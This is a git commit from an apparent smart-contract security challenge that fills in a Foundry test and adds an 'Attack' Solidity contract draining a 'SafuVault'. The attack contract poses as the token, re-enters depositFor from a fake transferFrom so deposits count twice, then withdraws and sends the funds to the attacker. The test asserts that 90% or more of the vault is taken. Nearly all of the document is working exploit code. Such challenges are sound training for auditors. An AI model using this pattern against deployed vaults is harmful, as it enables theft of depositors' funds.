f57c97682122fbc744adcd95b4b6c1c58f8bd1f2
KirinFilip <filip.kirin.zg1@gmail.com>
2023-03-26 19:41:34 +0200

    safu-vault-solution

--- test/2-safu-vault.sol
+++ test/2-safu-vault.sol
@@ -7,16 +7,16 @@ import {console} from "forge-std/console.sol";
 // core contracts
 import {Token} from "src/other/Token.sol";
 import {SafuStrategy} from "src/safu-vault/SafuStrategy.sol";
-import {SafuVault,IStrategy} from "src/safu-vault/SafuVault.sol";
+import {SafuVault, IStrategy} from "src/safu-vault/SafuVault.sol";
 
+import {Attack} from "./AttackContracts/2-SafuVaultAttack.sol";
 
 contract Testing is Test {
-
-    address attacker = makeAddr('attacker');
-    address o1 = makeAddr('o1');
-    address o2 = makeAddr('o2');
-    address admin = makeAddr('admin'); // should not be used
-    address adminUser = makeAddr('adminUser'); // should not be used
+    address attacker = makeAddr("attacker");
+    address o1 = makeAddr("o1");
+    address o2 = makeAddr("o2");
+    address admin = makeAddr("admin"); // should not be used
+    address adminUser = makeAddr("adminUser"); // should not be used
 
     Token usdc;
     SafuVault safuVault;
@@ -24,7 +24,6 @@ contract Testing is Test {
 
     /// preliminary state
     function setUp() public {
-
         // funding accounts
         vm.deal(admin, 10_000 ether);
         vm.deal(attacker, 10_000 ether);
@@ -32,14 +31,16 @@ contract Testing is Test {
 
         // deploying token contract
         vm.prank(admin);
-        usdc = new Token('USDC','USDC');
+        usdc = new Token("USDC", "USDC");
 
         address[] memory addresses = new address[](2);
         uint256[] memory amounts = new uint256[](2);
 
-        addresses[0]=attacker; addresses[1]=adminUser;
-        amounts[0]=10_000e18; amounts[1]=10_000e18;
-        
+        addresses[0] = attacker;
+        addresses[1] = adminUser;
+        amounts[0] = 10_000e18;
+        amounts[1] = 10_000e18;
+
         // attacker gets 10_000 USDC as starting funds
         vm.prank(admin);
         usdc.mintPerUser(addresses, amounts);
@@ -48,24 +49,29 @@ contract Testing is Test {
         vm.prank(admin);
         safuStrategy = new SafuStrategy(address(usdc));
         vm.prank(admin);
-        safuVault = new SafuVault(IStrategy(address(safuStrategy)),'LP Token','LP');
+        safuVault = new SafuVault(
+            IStrategy(address(safuStrategy)),
+            "LP Token",
+            "LP"
+        );
 
         vm.prank(admin);
         safuStrategy.setVault(address(safuVault));
 
         // other user deposits 10_000 USDC into the safu yield vault
         vm.prank(adminUser);
-        usdc.approve(address(safuVault),type(uint).max);
+        usdc.approve(address(safuVault), type(uint).max);
         vm.prank(adminUser);
         safuVault.depositAll();
-
     }
 
     /// solves the challenge
     function testChallengeExploit() public {
-        vm.startPrank(attacker,attacker);
+        vm.startPrank(attacker, attacker);
 
-        // implement solution here
+        Attack attack = new Attack(address(safuVault), address(usdc));
+        usdc.transfer(address(attack), 10_000e18);
+        attack.startAttack();
 
         vm.stopPrank();
         validation();
@@ -73,12 +79,10 @@ contract Testing is Test {
 
     /// expected final state
     function validation() public {
-
         // attacker drains >= 90% of funds
-        uint256 totalVaultFunds = usdc.balanceOf(address(safuVault))+usdc.balanceOf(address(safuStrategy));
-        assertLe(totalVaultFunds,1_000e18);
-        assertGe(usdc.balanceOf(attacker),19_000e18);
-
+        uint256 totalVaultFunds = usdc.balanceOf(address(safuVault)) +
+            usdc.balanceOf(address(safuStrategy));
+        assertLe(totalVaultFunds, 1_000e18);
+        assertGe(usdc.balanceOf(attacker), 19_000e18);
     }
-
 }
---
+++ test/AttackContracts/2-SafuVaultAttack.sol
@@ -0,0 +1,46 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "src/safu-vault/SafuVault.sol";
+
+contract Attack {
+    address public attacker;
+    SafuVault public safuVault;
+    IERC20 public usdc;
+    uint256 public loops;
+
+    constructor(address _safuVault, address _usdcAddress) {
+        attacker = msg.sender;
+        safuVault = SafuVault(_safuVault);
+        usdc = IERC20(_usdcAddress);
+    }
+
+    function startAttack() external {
+        // get usdc balance of this contract = 10_000
+        uint256 usdcBalance = usdc.balanceOf(address(this));
+
+        uint256 usdcAmount = usdcBalance / 1;
+
+        // call safuVault.depositFor() making it call transferFrom from this contract
+        // with usdcAmount amount for user this address
+        safuVault.depositFor(address(this), usdcAmount, address(this));
+
+        // after the loop is done call withdrawAll() from SafuVault
+        safuVault.withdrawAll();
+        // transfer all usdc in this contract to the attacker
+        usdc.transfer(attacker, usdc.balanceOf(address(this)));
+    }
+
+    // gets called after depositFor() in startAttack()
+    function transferFrom(address from, address to, uint256 amount) external {
+        if (loops < 1) {
+            loops++;
+
+            // transfer ammount = usdcAmount to the msg.sender = SafuVault
+            usdc.transfer(msg.sender, amount);
+            // again call depositFor() with amount = usdcAmount
+            safuVault.depositFor(address(this), amount, address(this));
+        }
+    }
+}
